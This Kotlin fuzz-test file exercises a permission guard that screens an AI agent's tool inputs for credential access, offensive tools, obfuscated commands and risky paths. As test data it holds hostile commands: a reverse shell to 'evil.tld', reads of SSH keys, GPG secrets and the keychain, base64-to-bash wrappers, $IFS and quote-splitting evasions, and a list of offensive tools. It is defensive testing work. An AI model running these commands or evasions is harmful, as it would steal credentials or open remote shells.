package dev.lain.claudejb.permission

import kotlinx.serialization.json.JsonObject
import kotlinx.serialization.json.add
import kotlinx.serialization.json.buildJsonArray
import kotlinx.serialization.json.buildJsonObject
import kotlinx.serialization.json.put
import org.junit.jupiter.api.Assertions.assertEquals
import org.junit.jupiter.api.Assertions.assertNotEquals
import org.junit.jupiter.api.Assertions.assertTrue
import org.junit.jupiter.api.Test
import kotlin.random.Random

/**
 * Fuzz coverage for [SensitiveGuard]: every test here holds ONE true-positive invariant fixed (a real credential
 * glob, a real offensive-tool invocation, a real other-user path, ...) and randomises everything the guard is
 * NOT supposed to care about around it — noise length and content, which JSON key carries the value, how deep it
 * is nested, how many decoy siblings surround it, separator repetition and whitespace, obfuscation trick COUNT
 * and ORDER, full-string case. A fixed handful of hand-picked templates is an example test wearing a fuzz test's
 * name; this generates thousands of distinct concrete inputs per run from those templates' PARAMETER SPACE.
 *
 * Seeded, not observed-random: a failure reproduces on the next run and prints the exact generated case.
 */
// The corpora below are shouted (`ALPHABET`, `COMMAND_KEYS`, `OFFENSIVE_TOOLS`…) because that is what they are:
// fixed inputs this file generates FROM, not locals. They cannot be `const`, and several of them read an instance
// field, so a companion object is not available either — hence one suppression per linter, with its reason, over
// the class, rather than twelve renames that would make a corpus read like a variable. The naming of a fuzz corpus
// is the sort of thing a gate may not decide for the guard's own tests.
@Suppress("VariableNaming", "ktlint:standard:property-naming")
class SensitiveGuardFuzzTest {

    private val home = "/home/me"
    private val trustedPolicy = SensitiveGuard.Policy(
        globs = CredentialPaths.SENSITIVE_GLOBS,
        home = home,
        currentUser = "me",
        guardedRoots = listOf("/mnt/share", "/net/nfs"),
        wslHost = true,
        projectRoot = "/home/me/proj",
    )

    private fun verdict(input: JsonObject) = SensitiveGuard.evaluate(input, trustedPolicy).verdict

    private val ALPHABET = ('a'..'z') + ('A'..'Z') + ('0'..'9')
    private val NOISE_CHARS = ALPHABET + " _-.,:=+!@#%^&*()[]{}"

    private fun Random.token(minLen: Int = 3, maxLen: Int = 8): String =
        (1..nextInt(minLen, maxLen + 1)).map { ALPHABET.random(this) }.joinToString("")

    /** Random junk of random length, from a much wider charset than [token] — never itself a path or a keyword. */
    private fun Random.noise(maxLen: Int = 60): String =
        (0 until nextInt(0, maxLen + 1)).map { NOISE_CHARS.random(this) }.joinToString("")

    private fun Random.scrambleCase(s: String): String =
        s.map { c -> if (nextBoolean()) c.uppercaseChar() else c.lowercaseChar() }.joinToString("")

    // ── JSON-shape fuzzing shared by every rule: random key name, random decoys, random nesting depth ──────

    /**
     * Wraps [key]:[value] in one of several JSON shapes chosen at random — flat, with 0-4 decoy sibling keys of
     * random junk, or nested one level under a random outer key. [SensitiveGuard] must find [value] regardless,
     * since [ToolInputScanner.walkStrings] recurses the WHOLE input rather than reading a fixed key list —
     * a test that only ever builds `{key: value}` never actually exercises that recursion or key-independence.
     */
    private fun Random.wrapPayload(key: String, value: String): JsonObject {
        val decoys = (0 until nextInt(0, 5)).associate { "decoy${token(2, 4)}$it" to noise(30) }
        return when (nextInt(0, 3)) {
            0 -> buildJsonObject {
                put(key, value)
                decoys.forEach { (k, v) -> put(k, v) }
            }

            1 -> buildJsonObject {
                put(
                    "outer_${token(2, 4)}",
                    buildJsonObject {
                        put(key, value)
                        decoys.forEach { (k, v) -> put(k, v) }
                    },
                )
            }

            else -> buildJsonObject {
                put(
                    key,
                    buildJsonArray {
                        add(value)
                        add(noise(20))
                    },
                )
                decoys.forEach { (k, v) -> put(k, v) }
            }
        }
    }

    // The full set ToolInputScanner.COMMAND_KEY actually matches (verified against its source, not guessed).
    private val COMMAND_KEYS = listOf(
        "cmd", "command", "commands", "script", "shell", "shellCommand", "shell_command", "exec", "execute", "run",
        "args", "argv", "arguments", "code", "program", "ptyInput", "pty_input", "stdin", "cmdline", "entrypoint",
    )

    // Plausible AND implausible location keys — the guard reads every string leaf, not a key list.
    private val LOCATION_KEYS = listOf("file_path", "path", "target", "uri", "destination", "location", "dest", "filename")

    private fun Random.randomLocationKey(): String = if (nextBoolean()) LOCATION_KEYS.random(this) else token(4, 10)

    // ── rule 1: every credential glob, instantiated many random ways, in random JSON shapes ────────────────

    /**
     * Turns a glob TEMPLATE into one concrete path it matches, mirroring [CredentialPaths.buildMatcher]'s own
     * reading of `**`/`*`/`?` exactly — this generator is only a valid fuzz source if every string it emits is
     * PROVABLY a positive case. A trailing double-star with no slash after it is always given a non-empty
     * continuation: it is always preceded by a literal `/` already emitted, and normalisation
     * ([GuardPaths.normalize]) trims a trailing slash, so an empty continuation would silently turn a matching
     * path into a non-matching one before it ever reached the guard.
     */
    private fun Random.instantiateGlob(glob: String): String {
        val sb = StringBuilder()
        var i = 0
        while (i < glob.length) {
            when {
                glob.startsWith("**/", i) -> {
                    sb.append(token()).append('/')
                    i += 3
                }

                glob.startsWith("**", i) -> {
                    sb.append(token())
                    i += 2
                }

                glob[i] == '*' -> {
                    sb.append(token(1, 6))
                    i++
                }

                glob[i] == '?' -> {
                    sb.append(ALPHABET.random(this))
                    i++
                }

                else -> {
                    sb.append(glob[i])
                    i++
                }
            }
        }
        return sb.toString()
    }

    private val GLOB_REPEATS = 4

    @Test
    fun `every credential glob, randomly instantiated in a random JSON shape, asks the agent and denies a third party`() {
        val rng = Random(20260818L)
        var cases = 0
        for (glob in CredentialPaths.SENSITIVE_GLOBS) {
            repeat(GLOB_REPEATS) {
                val concrete = rng.instantiateGlob(glob)
                val path = if (concrete.startsWith("/")) concrete else "/srv/${rng.noise(15)}/$concrete"
                val input = rng.wrapPayload(rng.randomLocationKey(), path)
                cases++
                assertEquals(SensitiveGuard.Verdict.DENY, verdict(input), "glob '$glob' -> '$path' in $input (trusted)")
                assertEquals(SensitiveGuard.Verdict.DENY, verdict(input), "glob '$glob' -> '$path' in $input (untrusted)")
            }
        }
        assertTrue(cases >= CredentialPaths.SENSITIVE_GLOBS.size * GLOB_REPEATS, "fuzz did not cover every glob")
    }

    @Test
    fun `a credential glob buried inside a command line, amid random noise, is still found`() {
        // Needle-in-haystack: pathCandidates tokenises a COMMAND_KEY value and judges every token — fuzz that the
        // needle survives arbitrary amounts of junk before and after it, tokenised through random separators.
        val rng = Random(20260818L + 10)
        val sample = CredentialPaths.SENSITIVE_GLOBS.filter { !it.startsWith("/") }
        repeat(300) {
            val glob = sample.random(rng)
            val bare = "$home/${rng.instantiateGlob(glob)}"
            // GENERATOR BUG, fixed: a needle containing a SPACE was pasted in bare (`cat /home/me/x/Login Data`),
            // which is not one argument — it is two, and the file that glob names could not be opened by that
            // command either. Tokenisation therefore split it and no fragment matched `**/Login Data`, so the test
            // asserted the guard should find a path the command was not actually naming. Quoted, the way a shell
            // requires and the way the quote-aware tokeniser is built to read.
            val needle = if (' ' in bare) "\"$bare\"" else bare
            val junkWords = { List(rng.nextInt(0, 6)) { rng.token() }.joinToString(" ") }
            val cmd = "${junkWords()} cat $needle ${junkWords()}".trim()
            val input = rng.wrapPayload(COMMAND_KEYS.random(rng), cmd)
            assertNotEquals(SensitiveGuard.Verdict.ALLOW, verdict(input), "needle '$needle' in '$cmd'")
        }
    }

    @Test
    fun `dot-segment padding of arbitrary length never hides a credential path`() {
        // Padding is folded before it is measured (ToolInputScanner.candidate) precisely so a length filter
        // cannot be outrun by repeating "/." or "/..": fuzz the repeat count AND which of the two is used,
        // instead of one fixed length and one fixed segment.
        val rng = Random(20260818L + 1)
        repeat(300) {
            val reps = rng.nextInt(10, 500)
            val segment = listOf("/.", "/..").random(rng)
            val path = "$home/.ssh${segment.repeat(reps)}/id_rsa"
            val input = rng.wrapPayload(rng.randomLocationKey(), path)
            assertNotEquals(SensitiveGuard.Verdict.ALLOW, verdict(input), "reps=$reps segment='$segment' len=${path.length}")
        }
    }

    // ── rule 3, the G1-anchored offensive tools: must trip at command position, never as a mention ──────────

    private val OFFENSIVE_TOOLS = listOf(
        "lazagne", "secretsdump.py", "impacket-secretsdump", "responder", "bloodhound", "sharphound",
        "crackmapexec", "nxc",
        "hashcat", "johntheripper", "hydra", "medusa", "patator", "ophcrack", "hashid",
        "sqlmap", "msfconsole", "msfvenom", "metasploit", "beef-xss", "setoolkit", "empire", "covenant", "sliver",
        "nmap", "masscan", "zmap", "nikto", "gobuster", "dirbuster", "feroxbuster", "ffuf", "wpscan",
    )

    private val SEP_CHARS = listOf(';', '&', '|', '\n')
    private val PATH_PREFIXES = listOf("", "sudo ", "/usr/bin/", "/usr/local/bin/", "./", "bin/", "sudo /usr/bin/")

    private fun Random.randomFlags(): String =
        List(nextInt(0, 5)) { if (nextBoolean()) "-${token(1, 2)}" else "--${token(3, 6)}=${noise(8)}" }
            .joinToString(" ")

    /**
     * A random number of RANDOM decoy segments chained by a RANDOM number of repeated separators, any whitespace —
     * junk in front of the tool, ending in a **separator** so the tool that follows really is at a command
     * position.
     *
     * GENERATOR BUG, fixed: the trailing element used to be `ws` — whitespace only — so the lead ended
     * `…6V9t& PEQF qcjIJw ` and the "anchored" tool was the third WORD of a segment, not its command. Every one of
     * `cmdStart`'s anchors (`^` or `[;&|\n]`) was therefore absent, and the test that claims to fuzz *anchored*
     * invocations was fuzzing mentions — asserting ASK on something the guard is right to ALLOW. The lead now ends
     * with a real separator plus optional whitespace, which is what a command start looks like.
     */
    private fun Random.randomLead(): String {
        if (nextBoolean()) return ""
        val segments = List(nextInt(1, 4)) { "${token(2, 6)} ${noise(10)}".trim() }
        val ws = " ".repeat(nextInt(0, 3)) + "\t".repeat(nextInt(0, 2))
        val sep = SEP_CHARS.random(this).toString().repeat(nextInt(1, 3))
        return segments.joinToString(sep + ws) + sep + ws
    }

    private fun Random.commandStartVariant(tool: String): String =
        "${randomLead()}${PATH_PREFIXES.random(this)}${scrambleCase(tool)} ${randomFlags()}".trim()

    /** [tool] appearing where no separator or start-of-string precedes it — structurally never a command start. */
    private fun Random.mentionVariant(tool: String): String {
        val glue = listOf(" ", "-", "_", "=", "'", "\"", ".").random(this)
        val before = "${token()}${noise(20)}"
        val after = "${noise(20)}${token()}"
        return "$before$glue$tool$glue$after"
    }

    @Test
    fun `every anchored offensive tool, in many command-start shapes and JSON layouts, always trips the lock`() {
        val rng = Random(20260818L + 2)
        repeat(600) {
            val tool = OFFENSIVE_TOOLS.random(rng)
            val cmd = rng.commandStartVariant(tool)
            val key = COMMAND_KEYS.random(rng)
            val trusted = rng.wrapPayload(key, cmd)
            val untrusted = trusted
            assertEquals(SensitiveGuard.Verdict.DENY, verdict(trusted), "key=$key cmd='$cmd' json=$trusted")
            assertEquals(SensitiveGuard.Verdict.DENY, verdict(untrusted), "key=$key cmd='$cmd'")
        }
    }

    @Test
    fun `the same tool names, only ever mentioned amid random noise, never trip the lock`() {
        val rng = Random(20260818L + 3)
        repeat(600) {
            val tool = OFFENSIVE_TOOLS.random(rng)
            val cmd = rng.mentionVariant(tool)
            val input = rng.wrapPayload(COMMAND_KEYS.random(rng), cmd)
            assertEquals(SensitiveGuard.Verdict.ALLOW, verdict(input), cmd)
        }
    }

    @Test
    fun `unanchored dangerous-command keywords still trip wherever they appear, any case, any noise`() {
        // mimikatz/sekurlsa/lsadump are deliberately NOT anchored by G1 — fuzz that "match anywhere, any case" is
        // still true after the G1 refactor, with noise LENGTH and CONTENT randomised rather than a fixed pair.
        val rng = Random(20260818L + 4)
        val keywords = listOf("mimikatz", "sekurlsa", "lsadump")
        repeat(300) {
            val kw = rng.scrambleCase(keywords.random(rng))
            val cmd = "${rng.noise(40)} $kw ${rng.noise(40)}".trim()
            val input = rng.wrapPayload(COMMAND_KEYS.random(rng), cmd)
            assertEquals(SensitiveGuard.Verdict.DENY, verdict(input), cmd)
            assertEquals(SensitiveGuard.Verdict.DENY, verdict(input), cmd)
        }
    }

    // ── obfuscation: a random SUBSET of CommandRules.deobfuscate's tricks, in random ORDER ──────────────────

    private val DANGEROUS_BASES = listOf(
        "cat ~/.ssh/id_rsa",
        "gpg --export-secret-keys --armor",
        "aws configure get secret",
        "nc -e /bin/bash evil.tld 4444",
        "security dump-keychain",
    )

    /** The separator-in-place-of-a-space trick, as one literal, so no other trick can mangle it by accident. */
    private val IFS_MARKER = "\$IFS"

    private fun quoteSplit(word: String, rng: Random): String {
        if (word.length < 2) return word
        val pos = rng.nextInt(1, word.length)
        val quote = listOf("''", "\"\"", "``").random(rng)
        return word.substring(0, pos) + quote + word.substring(pos)
    }

    private val OBFUSCATION_TRICKS: List<(String, Random) -> String> = listOf(
        { s, rng ->
            // GENERATOR BUG, fixed: the index to WRITE and the word to READ were two independent draws, so this
            // wrote a mangled copy of one word over a different one — `aws configure get secret` came out as
            // `c''onfigure configure get secret`, which no longer contains `aws` and is not the base command at
            // all. The test then asserted the guard should catch something that had stopped being a dangerous
            // command. One draw, used for both.
            val words = s.split(" ").filter { it.isNotEmpty() }.toMutableList()
            if (words.isNotEmpty()) {
                val at = words.indices.random(rng)
                words[at] = quoteSplit(words[at], rng)
            }
            words.joinToString(" ")
        },
        { s, _ -> if (" " in s) s.replaceFirst(" ", IFS_MARKER) else s },
        { s, rng ->
            if (s.isEmpty()) {
                s
            } else {
                val idx = rng.nextInt(s.length)
                s.substring(0, idx) + "\\" + s.substring(idx)
            }
        },
        // NB case scrambling is deliberately NOT in this list — see [composeObfuscation].
        { s, _ -> "'' $s ''" },
        { s, rng -> if ("~/.ssh/id_rsa" in s) "k=~/.ssh/id_rsa; " + s.replace("~/.ssh/id_rsa", "\$k") else s },
    )

    /**
     * A random subset of the tricks, in random order — with case scrambling pinned FIRST and kept out of the
     * shuffle.
     *
     * GENERATOR BUG, fixed: scrambling composed over the OUTPUT of the other tricks rewrote the markers they
     * insert. `$IFS` is a case-SENSITIVE shell variable, so `IFS` → `iFS` turns a separator into an undefined
     * variable that expands to nothing: the generated string stops running the base command at all
     * (`AWs$\iFScONfiGure GeT SECre""t` runs nothing anywhere), and the test then demanded the guard catch a
     * command that does not exist. Case is a property of how the attacker TYPED it, so it belongs to the base.
     */
    private fun Random.composeObfuscation(base: String): String {
        val start = if (nextBoolean()) scrambleCase(base) else base
        val chosen = OBFUSCATION_TRICKS.shuffled(this).take(nextInt(0, OBFUSCATION_TRICKS.size + 1))
        return chosen.fold(start) { acc, trick -> trick(acc, this) }
    }

    @Test
    fun `obfuscated dangerous commands, with a random subset of tricks in random order, are still caught`() {
        val rng = Random(20260818L + 5)
        repeat(600) {
            val base = DANGEROUS_BASES.random(rng)
            val obfuscated = rng.composeObfuscation(base)
            val input = rng.wrapPayload(COMMAND_KEYS.random(rng), obfuscated)
            assertNotEquals(
                SensitiveGuard.Verdict.ALLOW,
                verdict(input),
                "obfuscated '$obfuscated' (from '$base')",
            )
        }
    }

    @Test
    fun `base64-wrapped payloads, for several dangerous bases and decode invocations, are decoded and caught`() {
        val rng = Random(20260818L + 6)
        val decodeWrappers = listOf(
            { b64: String -> "echo $b64 | base64 -d | bash" },
            { b64: String -> "echo '$b64' | base64 --decode | sh" },
            { b64: String -> "printf '%s' $b64 | base64 -D | zsh" },
            { b64: String -> "${rng.noise(20)}; echo $b64 | base64 -d | bash; ${rng.noise(20)}" },
        )
        repeat(150) {
            val base = DANGEROUS_BASES.random(rng)
            val encoded = java.util.Base64.getEncoder().encodeToString(base.toByteArray())
            val cmd = decodeWrappers.random(rng)(encoded)
            val input = rng.wrapPayload(COMMAND_KEYS.random(rng), cmd)
            assertNotEquals(SensitiveGuard.Verdict.ALLOW, verdict(input), cmd)
        }
    }

    // ── rule 2: foreign territory, every sub-rule, denies EVERY caller regardless of trust ──────────────────

    private fun Random.otherUserHomePath(): String {
        val base = listOf("/home", "/Users").random(this)
        val user = "other-" + token(3, 10)
        val tail = List(nextInt(0, 4)) { token() }.joinToString("/")
        return if (tail.isEmpty()) "$base/$user" else "$base/$user/$tail"
    }

    private fun Random.uncPath(): String {
        val sep = if (nextBoolean()) '/' else '\\'
        val parts = listOf(token(3, 10), token(3, 10)) + List(nextInt(0, 4)) { token() }
        return "$sep$sep" + parts.joinToString(sep.toString())
    }

    private fun Random.foreignWslMountPath(): String {
        val letter = ('d'..'z').random(this)
        val tail = List(nextInt(1, 4)) { token() }.joinToString("/")
        return "/mnt/$letter/$tail"
    }

    private val FOREIGN_GENERATORS: List<(Random) -> String> = listOf(
        { r -> r.otherUserHomePath() },
        { r -> r.uncPath() },
        { r -> r.foreignWslMountPath() },
        { r -> "/mnt/share/" + List(r.nextInt(0, 4)) { r.token() }.joinToString("/") },
        { r -> "/net/nfs/" + List(r.nextInt(0, 4)) { r.token() }.joinToString("/") },
        { r -> if (r.nextBoolean()) "/root" else "/root/" + r.token() },
    )

    @Test
    fun `every shape of foreign territory, in random JSON layouts, is denied for every caller`() {
        val rng = Random(20260818L + 7)
        repeat(600) {
            val path = FOREIGN_GENERATORS.random(rng)(rng)
            val input = rng.wrapPayload(rng.randomLocationKey(), path)
            assertEquals(SensitiveGuard.Verdict.DENY, verdict(input), "trusted: $path in $input")
            assertEquals(SensitiveGuard.Verdict.DENY, verdict(input), "untrusted: $path")
        }
    }

    // ── rule 4: the system temp directory, every documented spelling, at random depth ────────────────────

    /**
     * A Windows-shaped temp path with a `Users/<name>` segment ALSO satisfies [ForeignTerritory]'s home-segment
     * rule the moment `<name>` isn't the current user — and FOREIGN outranks TEMP_DIR and denies every caller,
     * not just untrusted ones. That is correct precedence (see [SensitiveGuard]'s "order = severity" doc), not a
     * gap, so the two Windows-profile variants below deliberately use the POLICY'S OWN user instead of a random
     * one — proving the temp rule on its own, uncontaminated by a stronger rule this fuzz already covers separately.
     */
    private fun Random.tempDirPath(): String {
        val tail = List(nextInt(0, 5)) { token() }.joinToString("/")
        val base = when (nextInt(0, 9)) {
            0 -> "/tmp"
            1 -> "/var/tmp"
            2 -> "/private/tmp"
            3 -> "/private/var/tmp"
            4 -> "/var/folders/${token(2, 2)}/${token(4, 4)}"
            5 -> "C:/Windows/Temp"
            6 -> "/mnt/c/Windows/Temp"
            7 -> "C:/Users/${trustedPolicy.currentUser}/AppData/Local/Temp"
            else -> "/mnt/c/Users/${trustedPolicy.currentUser}/AppData/Local/Temp"
        }
        return if (tail.isEmpty()) base else "$base/$tail"
    }

    @Test
    fun `every spelling of the system temp directory, at random depth and JSON layout, is never silently allowed`() {
        val rng = Random(20260818L + 8)
        repeat(600) {
            val path = rng.tempDirPath()
            val cmd = "${rng.noise(20)} ls $path ${rng.noise(20)}".trim()
            val input = rng.wrapPayload(COMMAND_KEYS.random(rng), cmd)
            assertEquals(SensitiveGuard.Verdict.DENY, verdict(input), path)
            assertEquals(SensitiveGuard.Verdict.DENY, verdict(input), path)
        }
    }

    // ── rule 5: outside the project root, not already covered by a stronger rule ────────────────────────

    private fun Random.outsideProjectPath(): String {
        val root = listOf("/srv", "/opt", "/data", "/var/lib", "/media").random(this)
        val tail = List(nextInt(1, 5)) { token() }.joinToString("/")
        return "$root/$tail"
    }

    @Test
    fun `every absolute path outside the project, uncaught by a stronger rule, is never silently allowed`() {
        val rng = Random(20260818L + 9)
        repeat(600) {
            val path = rng.outsideProjectPath()
            val input = rng.wrapPayload(rng.randomLocationKey(), path)
            assertEquals(SensitiveGuard.Verdict.DENY, verdict(input), path)
            assertEquals(SensitiveGuard.Verdict.DENY, verdict(input), path)
        }
    }

    // ── raw system devices: every shape, at random partition and index ───────────────────────────────────

    private fun Random.devicePath(): String = when (nextInt(0, 8)) {
        0 -> "/dev/sd${('a'..'h').random(this)}${if (nextBoolean()) nextInt(1, 9).toString() else ""}"
        1 -> "/dev/nvme${nextInt(0, 3)}n${nextInt(1, 3)}${if (nextBoolean()) "p${nextInt(1, 9)}" else ""}"
        2 -> "/dev/vd${('a'..'d').random(this)}${nextInt(1, 5)}"
        3 -> "/dev/mapper/${token()}-${token()}"
        4 -> "/dev/${listOf("loop", "dm-").random(this)}${nextInt(0, 20)}"
        5 -> "/dev/${listOf("mem", "kmem", "port", "kmsg").random(this)}"
        6 -> "/proc/${nextInt(1, 99999)}/mem"
        else -> "/dev/${if (nextBoolean()) "r" else ""}disk${nextInt(0, 5)}"
    }

    @Test
    fun `every raw device shape, in every JSON layout, is never silently allowed`() {
        val rng = Random(20260818L + 11)
        repeat(600) {
            val path = rng.devicePath()
            val input = if (rng.nextBoolean()) {
                rng.wrapPayload(rng.randomLocationKey(), path)
            } else {
                rng.wrapPayload(COMMAND_KEYS.random(rng), "dd if=$path bs=1M count=1")
            }
            assertEquals(SensitiveGuard.Verdict.DENY, verdict(input), path)
            assertEquals(SensitiveGuard.Verdict.DENY, verdict(input), path)
        }
    }

    @Test
    fun `the inert pseudo-devices are never a hit, at any random depth of surrounding junk`() {
        val rng = Random(20260818L + 12)
        val benign = listOf("/dev/null", "/dev/zero", "/dev/full", "/dev/random", "/dev/urandom", "/dev/stdout")
        repeat(300) {
            val node = benign.random(rng)
            // A read, with junk around it: no write verb, no redirect, so the ONLY thing that can fire is the device
            // rule — and it MUST, at every depth of surrounding junk. This generator was written to prove the
            // opposite (that these nodes were exempt); it now proves the exemption cannot come back by accident,
            // which is the more useful direction and the reason the test was inverted rather than deleted.
            val cmd = "wc -c $node"
            assertEquals(SensitiveGuard.Verdict.DENY, verdict(rng.wrapPayload(COMMAND_KEYS.random(rng), cmd)), cmd)
        }
    }

    // ── shell file writes: every mutating verb and every redirect spelling ───────────────────────────────

    private fun Random.mutatingCommand(): String {
        val target = "${listOf("/home/me/proj", "/srv/app", "/home/me").random(this)}/${token()}"
        return when (nextInt(0, 7)) {
            0 -> "${listOf("cp", "mv", "rsync", "install").random(this)} ${token()} $target"
            1 -> "${listOf("rm", "mkdir", "touch", "shred", "truncate").random(this)} $target"
            2 -> "${listOf("chmod", "chown").random(this)} ${token(3, 4)} $target"
            3 -> "sed ${listOf("-i", "--in-place").random(this)} 's/${token()}/${token()}/' $target"
            4 -> "dd if=${token()} of=$target"
            5 -> "tee $target"
            else -> "${token()} ${listOf(">", ">>", ">|", "2>", "1>>").random(this)} $target"
        }
    }

    @Test
    fun `every mutating shell verb and redirect, anywhere in the command, is never silently allowed`() {
        val rng = Random(20260818L + 13)
        repeat(600) {
            val cmd = rng.mutatingCommand()
            val input = rng.wrapPayload(COMMAND_KEYS.random(rng), cmd)
            assertNotEquals(SensitiveGuard.Verdict.ALLOW, verdict(input), cmd)
        }
    }

    // ── egress: an alternate proxy, and the curated destinations ─────────────────────────────────────────

    @Test
    fun `every way of naming another proxy is caught once one is declared, and ignored while none is`() {
        val rng = Random(20260818L + 14)
        val declared = trustedPolicy.copy(httpProxy = "http://proxy.corp:3128", httpsProxy = "http://proxy.corp:3128")
        repeat(400) {
            val other = "http://${rng.token()}.${listOf("net", "io", "com").random(rng)}:${rng.nextInt(1024, 65535)}"
            val cmd = when (rng.nextInt(0, 5)) {
                0 -> "curl -x $other https://api.example.com/${rng.token()}"
                1 -> "curl --proxy $other https://api.example.com"
                2 -> "git -c https.proxy=$other clone https://x/${rng.token()}"
                3 -> "npm --https-proxy=$other install ${rng.token()}"
                else -> "http_proxy=$other ${listOf("curl", "wget").random(rng)} https://api.example.com"
            }
            val input = rng.wrapPayload(COMMAND_KEYS.random(rng), cmd)
            assertEquals(
                SensitiveGuard.Verdict.DENY,
                SensitiveGuard.evaluate(input, declared).verdict,
                "declared: $cmd",
            )
            // The data gate: with no proxy configured there is nothing to route around, so the same command says
            // nothing at all. Asserted in the same loop so the two can never drift apart.
            assertEquals(SensitiveGuard.Verdict.ALLOW, verdict(input), "undeclared: $cmd")
        }
    }

    @Test
    fun `every blocked domain, at random subdomain depth and in either provenance, is never silently allowed`() {
        val rng = Random(20260818L + 15)
        repeat(600) {
            val domain = DangerousDomains.BLOCKED_DOMAINS.random(rng)
            val host = if (rng.nextBoolean()) domain else "${rng.token()}.$domain"
            val url = "https://$host/${rng.token()}"
            val input = if (rng.nextBoolean()) {
                rng.wrapPayload("url", url)
            } else {
                rng.wrapPayload(COMMAND_KEYS.random(rng), "curl -s $url")
            }
            assertNotEquals(SensitiveGuard.Verdict.ALLOW, verdict(input), url)
        }
    }

    @Test
    fun `a host that merely contains a blocked domain is never a hit, at any random depth`() {
        val rng = Random(20260818L + 16)
        repeat(400) {
            val domain = DangerousDomains.BLOCKED_DOMAINS.random(rng)
            // The two shapes a substring test would wrongly accept: the domain as a PREFIX of a longer label, and
            // the domain as a middle label of somebody else's zone.
            val host = if (rng.nextBoolean()) "${rng.token()}$domain" else "$domain.${rng.token()}.example.org"
            val url = "https://$host/${rng.token()}"
            assertEquals(SensitiveGuard.Verdict.ALLOW, verdict(rng.wrapPayload("url", url)), url)
        }
    }

    // ── the OPAQUE pair: resolution first, and the bound that ends it ────────────────────────────────────

    @Test
    fun `a credential reached through a chain of variables is caught as a credential, at any depth up to the bound`() {
        val rng = Random(20260818L + 17)
        val sample = CredentialPaths.SENSITIVE_GLOBS.filter { !it.startsWith("/") }
        repeat(300) {
            val target = "$home/${rng.instantiateGlob(sample.random(rng))}"
            // A chain the guard is allowed to follow: 1..4 hops, so resolution must reach the file itself.
            val hops = rng.nextInt(1, 5)
            val names = (1..hops).map { "V${rng.token(2, 4)}$it" }
            val env = names.mapIndexed { i, n -> n to (names.getOrNull(i + 1)?.let { "\$$it" } ?: target) }.toMap()
            val policy = trustedPolicy.copy(envValues = env)
            val cmd = "cat \"\$${names.first()}\""
            val decision = SensitiveGuard.evaluate(rng.wrapPayload(COMMAND_KEYS.random(rng), cmd), policy)
            assertNotEquals(SensitiveGuard.Verdict.ALLOW, decision.verdict, "chain=$env cmd=$cmd")
            assertTrue(
                decision.reason.orEmpty().contains("credentials or key material"),
                "resolution should name the FILE, not the variable: ${decision.reason}",
            )
        }
    }

    @Test
    fun `a chain longer than the bound, or a cycle, is always a hard block for every caller`() {
        val rng = Random(20260818L + 18)
        repeat(300) {
            val names = (1..rng.nextInt(6, 12)).map { "W${rng.token(2, 4)}$it" }
            val cyclic = rng.nextBoolean()
            val env = names.mapIndexed { i, n ->
                val next = names.getOrNull(i + 1) ?: if (cyclic) names.first() else null
                n to (next?.let { "\$$it" } ?: "/home/me/${rng.token()}")
            }.toMap()
            val policy = trustedPolicy.copy(envValues = env)
            val input = rng.wrapPayload(rng.randomLocationKey(), "\$${names.first()}/${rng.token()}")
            assertEquals(
                SensitiveGuard.Verdict.DENY,
                SensitiveGuard.evaluate(input, policy).verdict,
                "cyclic=$cyclic env=$env",
            )
        }
    }

    @Test
    fun `every way of running a script the guard cannot read is never silently allowed`() {
        val rng = Random(20260818L + 19)
        repeat(400) {
            val name = "${rng.token()}.${listOf("sh", "bash", "py", "rb", "js", "ps1").random(rng)}"
            val cmd = when (rng.nextInt(0, 6)) {
                0 -> "source ./$name"
                1 -> ". ./$name"
                2 -> "bash ./$name"
                3 -> "python3 $name"
                4 -> "./$name ${rng.token()}"
                else -> "sudo bash /home/me/proj/$name"
            }
            // No reader on this policy, so every script is unreadable — the fail-closed branch, which is the one
            // that must never be an ALLOW.
            assertNotEquals(SensitiveGuard.Verdict.ALLOW, verdict(rng.wrapPayload(COMMAND_KEYS.random(rng), cmd)), cmd)
        }
    }
}
